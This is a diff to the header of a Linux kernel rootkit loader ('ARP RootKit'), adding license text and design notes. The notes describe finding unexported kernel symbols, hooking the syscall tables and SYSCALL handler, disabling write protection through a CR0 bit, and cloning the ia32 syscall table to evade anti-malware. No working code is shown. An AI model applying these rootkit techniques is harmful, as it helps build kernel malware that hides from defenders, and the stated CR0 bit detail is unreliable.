@@ -1,4 +1,6 @@
 /*
+ *//* License
+ *
  * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
  *
  * This file is part of ARP RootKit.
@@ -16,11 +18,35 @@
  * You should have received a copy of the GNU General Public License
  * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
  *
+ *//* Notes
+ *
+ * This is the loader. Will get the RootKit Kernel resident into the Linux Kernel.
+ * For that, it uses PIC & PIE compilation flags of kernel.c.
+ *
+ * To hook the syscalls, it needs to find some unexported symbols:
+ *  - sys_call_table
+ *  - __vmalloc_node_range
+ *
+ * The code in kernel.c is compiled in the module in the .data section.
+ * So we only need to use set_memory_x to test it from inside the LKM.
+ * But maybe we can use __vmalloc_node_range() and PAGE_KERNEL_EXEC, to avoid
+ * the use of set_memory_x, as we know it's working (because at the beggining of dev I didn't know if the code was working even in the LKM context).
+ *
+ * set_memory_rw() and "_ro() are implemented by searching change_page_attr_set_clr(),
+ * inside set_memory_x() (which is exported, at least in v4.13).
+ * But as we couldn't replace the holders of the sys_call_table, to point our own table, I did research.
+ * And I found that disabling the 12th bit from CR0, we can write even if it's write-protected =).
+ *
+ * Atm, the <>_fastpath label on the SYSCALL handler is not used. But it's located and hooked.
+ * <>_slowpath is used, and could be also hooked.
+ *
+ * The interrupt 0x80 is still alive in x86_64, but only on compatibility mode.
+ * So, to prevent an anti-malware to use the syscalls in the ia32_sys_call_table, that table is also
+ * cloned and hooked.
+ *
+ * 24/01/2018 - D1W0U
  */
 
-/*
- * This is the loader. Will get the RootKit Kernel resident into the Linux Kernel.
- */
 #include <asm/desc.h>
 #include <linux/net.h>
 #include <asm/cpu_entry_area.h>
